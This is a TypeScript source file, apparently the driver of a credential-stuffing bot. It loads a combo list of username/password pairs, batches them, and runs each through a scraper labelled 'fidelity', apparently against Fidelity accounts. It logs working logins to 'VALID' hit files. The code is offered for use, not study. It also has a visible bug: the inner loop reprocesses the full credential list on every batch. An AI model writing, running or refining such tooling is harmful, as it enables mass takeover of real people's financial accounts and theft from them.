import fs from 'fs';
import path from 'path';
import chunk from 'lodash/chunk';

import { Credential } from './interface/credential';
import logger from './logger/logger';
import { getFileNameRange, getCredentials } from './utils';
import { getCredentialInformationScrapper } from './getCredentialInformationScrapper';
import {
  TIMEOUT_WAIT_FOR_NAVIGATION_MINUTES,
  TIMEOUT_WAIT_FOR_NAVIGATION_REFERRER_MINUTES,
} from './constants';

const GROUP_PER_PARTIAL_CREDENTIAL = 1;

const CHANGE_TABS_SECONDS = 3;

const HITS_FOLDER = 'hits';

const HITS_FULL_DIRECTORY = `/data/${HITS_FOLDER}`;

export const runWebScraping = async (
  time: string,
  comboListFileName: string,
) => {
  try {
    const credentials = await getCredentials(comboListFileName);

    console.log(credentials.slice(0, 10));

    const partialCredentialsChunkSize = 1000;

    const partialCredentials: Credential[][] = chunk(
      credentials,
      partialCredentialsChunkSize,
    );

    /**
     * LOGS for combo list informations
     */
    logger.warn(`TOTAL CREDENTIALS: ${credentials.length}`);

    logger.warn(
      `PARTIAL_CREDENTIAL_SCHUNK_SIZE: ${partialCredentialsChunkSize}`,
    );
    logger.warn(
      `QUANTITY OF PARTIAL_CREDENTIALS: ${partialCredentials.length}`,
    );
    logger.warn(
      `GROUP_PER_PARTIAL_CREDENTIAL: ${GROUP_PER_PARTIAL_CREDENTIAL}`,
    );
    logger.warn(`CHANGE_TABS_SECONDS: ${CHANGE_TABS_SECONDS}`);

    logger.warn(
      `TIMEOUT_WAIT_FOR_NAVIGATION_MINUTES: ${TIMEOUT_WAIT_FOR_NAVIGATION_MINUTES}`,
    );
    logger.warn(
      `TIMEOUT_WAIT_FOR_NAVIGATION_REFERRER_MINUTES: ${TIMEOUT_WAIT_FOR_NAVIGATION_REFERRER_MINUTES}`,
    );
    /**
     * END LOGS for combo list informations
     */

    logger.warn('STARTING BOT...');

    for (let index = 0; index < partialCredentials.length; index++) {
      // 1000 credentials per file
      const currentPartialCredential = partialCredentials[index];

      const VALID_PREFIX_FILE = `${comboListFileName} [`;
      const INVALID_PREFIX_FILE = `${comboListFileName} [`;
      const FILE_EXTENSION = '.txt';

      const validFileNameRange = `${getFileNameRange(
        VALID_PREFIX_FILE,
        index,
        partialCredentialsChunkSize,
        credentials.length,
      )}] VALID ${time}`;

      const invalidFileNameRange = `${getFileNameRange(
        INVALID_PREFIX_FILE,
        index,
        partialCredentialsChunkSize,
        credentials.length,
      )}] INVALID ${time}`;

      const dirname = process.cwd();

      const validFileDirectory = path.join(`${dirname}${HITS_FULL_DIRECTORY}`);

      const invalidFileDirectory = path.join(
        `${dirname}${HITS_FULL_DIRECTORY}`,
      );

      if (!fs.existsSync(validFileDirectory)) {
        fs.mkdirSync(validFileDirectory, { recursive: true });
      }

      const validFilePath = path.join(
        validFileDirectory,
        `${validFileNameRange}${FILE_EXTENSION}`,
      );

      const invalidFilePath = path.join(
        invalidFileDirectory,
        `${invalidFileNameRange}${FILE_EXTENSION}`,
      );

      const validWritableStream = fs.createWriteStream(validFilePath, 'utf8');

      const invalidWritableStream = fs.createWriteStream(
        invalidFilePath,
        'utf8',
      );

      validWritableStream.on('error', (error) => {
        logger.error(`ERROR WHILE WRITING FILE: ${error}`);
        throw `Error while writing file [${validFilePath}]: ${error}`;
      });

      invalidWritableStream.on('error', (error) => {
        logger.error(`ERROR WHILE WRITING FILE: ${error}`);
        throw `Error while writing file [${invalidFilePath}]: ${error}`;
      });

      const validWriteLineOnFile = (line: string) => {
        validWritableStream.write(`${line}\r\n`, 'utf8');
      };

      const invalidWriteLineOnFile = (line: string) => {
        invalidWritableStream.write(`${line}\r\n`, 'utf8');
      };

      logger.warn(
        `Starting to insert credentials on file ${validFileNameRange}...`,
        getFileNameRange(
          VALID_PREFIX_FILE,
          index,
          partialCredentialsChunkSize,
          credentials.length,
        ),
      );

      const credentialsChunks = chunk(
        credentials,
        GROUP_PER_PARTIAL_CREDENTIAL,
      );

      for (const credentialChunk of credentialsChunks) {
        try {
          await Promise.all(
            credentialChunk.map(async (credential) => {
              await Promise.all([
                getCredentialInformationScrapper(
                  credential,
                  validWriteLineOnFile,
                  invalidWriteLineOnFile,
                  validFileNameRange,
                  'fidelity',
                ),
              ]);
            }),
          );
        } catch (error) {
          logger.error(`ERROR ON FOR OF: ${error}`);
        }
      }
    }
  } catch (error) {
    logger.error(`ERROR ON HEAD WEB SCRAPING: ${error}`);

    console.error(error);
  }
};
